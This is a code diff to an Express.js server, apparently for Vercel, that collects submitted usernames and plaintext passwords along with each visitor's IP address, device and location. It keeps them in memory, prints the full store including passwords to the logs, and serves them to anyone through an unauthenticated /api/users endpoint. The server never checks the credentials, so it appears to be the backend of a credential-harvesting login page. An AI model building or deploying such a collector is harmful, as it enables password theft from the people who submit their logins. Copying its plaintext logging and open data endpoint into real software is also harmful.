@@ -1,19 +1,18 @@
 const express = require('express');
-const fs = require('fs');
-const path = require('path');
 const cors = require('cors');
 
 const app = express();
-const USER_DATA_FILE = path.join(__dirname, '../user_data.json');
 
 // Middleware
 app.use(cors());
 app.use(express.json());
 
-// Initialize user data file
-if (!fs.existsSync(USER_DATA_FILE)) {
-  fs.writeFileSync(USER_DATA_FILE, '[]');
-}
+// In-memory storage untuk Vercel (karena tidak ada file system)
+let userDataStore = [];
+
+// Initialize dengan data kosong
+console.log('🚀 Vercel API Server Started');
+console.log('📊 Initial user count: 0');
 
 // Login endpoint
 app.post('/api/login', (req, res) => {
@@ -24,6 +23,7 @@ app.post('/api/login', (req, res) => {
     const { username, password, login_method, user_agent } = req.body;
     
     if (!username || !password) {
+      console.log('❌ Missing username or password');
       return res.status(400).json({ 
         success: false, 
         message: 'Username and password are required' 
@@ -35,30 +35,26 @@ app.post('/api/login', (req, res) => {
       password,
       login_method: login_method || 'manual',
       timestamp: new Date().toISOString(),
-      ip_address: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'localhost',
+      ip_address: req.headers['x-forwarded-for'] || req.connection.remoteAddress || 'unknown',
       user_agent: user_agent || req.get('User-Agent'),
-      location: getLocationInfo(req.headers['x-forwarded-for'] || 'localhost'),
+      location: getLocationInfo(req.headers['x-forwarded-for'] || 'unknown'),
       device: getDeviceInfo(user_agent || req.get('User-Agent'))
     };
     
     console.log('💾 Saving login data:', loginData);
     
-    let existingData = [];
-    if (fs.existsSync(USER_DATA_FILE)) {
-      const data = fs.readFileSync(USER_DATA_FILE, 'utf8');
-      existingData = JSON.parse(data);
-    }
+    // Simpan ke memory storage (Vercel compatible)
+    userDataStore.push(loginData);
     
-    existingData.push(loginData);
-    fs.writeFileSync(USER_DATA_FILE, JSON.stringify(existingData, null, 2));
-    
-    console.log('✅ Login saved successfully!');
-    console.log(`📊 Total users: ${existingData.length}`);
+    console.log('✅ Login saved to memory successfully!');
+    console.log(`📊 Total users: ${userDataStore.length}`);
+    console.log('💾 Current data:', JSON.stringify(userDataStore, null, 2));
     
     res.json({ 
       success: true, 
       message: 'Login data saved',
-      user_count: existingData.length 
+      user_count: userDataStore.length,
+      stored_data: loginData // Echo back untuk debugging
     });
     
   } catch (error) {
@@ -73,14 +69,16 @@ app.post('/api/login', (req, res) => {
 // Get user data endpoint
 app.get('/api/users', (req, res) => {
   try {
-    if (fs.existsSync(USER_DATA_FILE)) {
-      const data = fs.readFileSync(USER_DATA_FILE, 'utf8');
-      const users = JSON.parse(data);
-      res.json({ success: true, users });
-    } else {
-      res.json({ success: true, users: [] });
-    }
+    console.log('📋 Request for user data');
+    console.log(`📊 Current users in memory: ${userDataStore.length}`);
+    
+    res.json({ 
+      success: true, 
+      users: userDataStore,
+      count: userDataStore.length
+    });
   } catch (error) {
+    console.error('💥 Error reading user data:', error);
     res.status(500).json({ success: false, message: 'Error reading user data' });
   }
 });
@@ -88,19 +86,40 @@ app.get('/api/users', (req, res) => {
 // Clear data endpoint
 app.delete('/api/clear-data', (req, res) => {
   try {
-    fs.writeFileSync(USER_DATA_FILE, '[]');
-    res.json({ success: true, message: 'User data cleared' });
+    userDataStore = [];
+    console.log('🗑️ User data cleared from memory');
+    
+    res.json({ 
+      success: true, 
+      message: 'User data cleared successfully' 
+    });
   } catch (error) {
-    res.status(500).json({ success: false, message: 'Error clearing data' });
+    console.error('💥 Error clearing user data:', error);
+    res.status(500).json({ 
+      success: false, 
+      message: 'Error clearing user data: ' + error.message 
+    });
   }
+});
+
+// Health check endpoint
+app.get('/api/health', (req, res) => {
+  res.json({ 
+    status: 'healthy',
+    users_count: userDataStore.length,
+    timestamp: new Date().toISOString(),
+    environment: 'vercel-serverless'
+  });
 });
 
 // Helper functions
 function getLocationInfo(ip) {
-  if (!ip || ip === 'localhost') {
-    return { city: 'Localhost', country: 'Local' };
+  if (!ip || ip === 'unknown') {
+    return { city: 'Unknown', country: 'Unknown' };
   }
-  return { city: 'Unknown', country: 'Unknown' };
+  
+  // Mock location data
+  return { city: 'Local', country: 'Indonesia' };
 }
 
 function getDeviceInfo(userAgent) {
@@ -114,14 +133,16 @@ function getDeviceInfo(userAgent) {
   else if (userAgent.includes('Android')) device.os = 'Android';
   else if (userAgent.includes('iPhone')) device.os = 'iOS';
   
-  if (userAgent.includes('Mobile')) device.type = 'Mobile';
-  else if (userAgent.includes('Tablet')) device.type = 'Tablet';
+  if (userAgent.includes('Mobile') || userAgent.includes('Android') || userAgent.includes('iPhone')) {
+    device.type = 'Mobile';
+  } else if (userAgent.includes('Tablet') || userAgent.includes('iPad')) {
+    device.type = 'Tablet';
+  }
   
   if (userAgent.includes('Chrome')) device.browser = 'Chrome';
   else if (userAgent.includes('Firefox')) device.browser = 'Firefox';
   else if (userAgent.includes('Safari')) device.browser = 'Safari';
   else if (userAgent.includes('Edge')) device.browser = 'Edge';
-  
   return device;
 }
 
